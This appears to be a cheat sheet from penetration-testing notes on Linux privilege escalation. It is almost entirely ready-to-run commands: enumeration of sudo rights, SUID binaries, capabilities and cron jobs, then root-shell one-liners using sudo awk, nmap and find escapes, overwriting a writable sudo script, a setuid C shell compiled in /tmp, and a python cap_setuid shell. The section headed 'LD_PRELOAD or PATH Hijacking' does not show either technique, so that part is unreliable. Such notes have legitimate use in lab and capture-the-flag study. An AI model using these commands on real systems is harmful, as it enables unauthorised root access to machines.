## 🛡️ Privilege Escalation

### Enumeration

```bash
sudo -l                                   # Check sudo permissions  
find / -perm -4000 -type f 2>/dev/null    # Find SUID binaries  
getcap -r / 2>/dev/null                   # Check Linux capabilities  
pspy64                                    # Monitor processes and scheduled tasks  
ls -la /etc/cron*                         # Check cron jobs  
```

### Exploitation

**Sudo Abuse**

```bash
sudo awk 'BEGIN {system("/bin/sh")}'      # If awk has NOPASSWD  
sudo /bin/bash                            # If bash is allowed without password  
```

**SUID Binaries**

```bash
/usr/bin/nmap                             # nmap --interactive → !sh  
/usr/bin/find                             # find . -exec /bin/sh \; -quit  
```

**Writable Script Abuse**

```bash
echo "/bin/bash" > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
sudo /usr/local/bin/backup.sh
```

**Kernel Exploits**

```bash
uname -a                                  # Check kernel version  
searchsploit linux kernel <version>       # Search for local privilege escalation exploits  
```

**LD_PRELOAD or PATH Hijacking**

```bash
echo 'int main(){setgid(0);setuid(0);system("/bin/sh");return 0;}' > /tmp/root.c
gcc /tmp/root.c -o /tmp/root
chmod +s /tmp/root
/tmp/root
```

**Capabilities Exploitation**

```bash
getcap -r / 2>/dev/null
# If python has cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```